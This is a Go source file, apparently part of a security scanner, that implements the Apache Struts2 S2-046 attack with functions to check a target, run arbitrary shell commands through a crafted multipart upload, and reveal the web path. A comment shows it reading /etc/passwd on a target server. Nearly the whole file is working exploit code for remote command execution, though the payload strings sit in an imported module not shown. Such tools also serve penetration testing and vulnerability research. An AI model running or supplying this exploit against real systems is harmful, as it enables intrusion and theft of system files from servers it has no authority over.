package s2_046

import (
	"bytes"
	"fmt"
	"github.com/fatih/color"
	"github.com/yhy0/Jie/pkg/protocols/httpx"
	"github.com/yhy0/Jie/scan/java/struts2/utils"
	"mime/multipart"
	"strings"
)

/*
ST2SG.exe --url http://192.168.123.128:8080/S2-046/doUpload.action --vn 46 --mode exec --cmd "cat /etc/passwd"
*/

func Check(url string) {
	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)
	_, err := writer.CreateFormFile("foo", utils.POC_s046_check)
	if err != nil {
	}
	_ = writer.WriteField("", "")
	writer.Close()

	var headers = make(map[string]string)
	headers["Content-Type"] = writer.FormDataContentType()
	resp, err := httpx.Request(url, "POST", body.String(), false, headers)
	if err != nil {
		return
	}
	utils.PostFunc4Struts2(url, body.String(), writer.FormDataContentType(), "")

	isVulable := strings.Contains(resp.Body, utils.Checkflag)
	if isVulable {
		color.Red("*Found Struts2-046！")
	} else {
		fmt.Println("Struts2-046 Not Vulnerable.")
	}
}
func ExecCommand(url string, command string) {
	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)
	_, err := writer.CreateFormFile("foo", utils.POC_s046_exec(command))
	if err != nil {
	}
	_ = writer.WriteField("", "")
	writer.Close()

	var headers = make(map[string]string)
	headers["Content-Type"] = writer.FormDataContentType()
	resp, err := httpx.Request(url, "POST", body.String(), false, headers)
	if err != nil {
		return
	}
	fmt.Println(resp.Body)
}

func GetWebpath(url string) {
	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)
	_, err := writer.CreateFormFile("foo", utils.POC_s046_webpath)
	if err != nil {
	}
	_ = writer.WriteField("", "")
	writer.Close()
	var headers = make(map[string]string)
	headers["Content-Type"] = writer.FormDataContentType()
	resp, err := httpx.Request(url, "POST", body.String(), false, headers)
	if err != nil {
		return
	}
	fmt.Println(resp.Body)
}
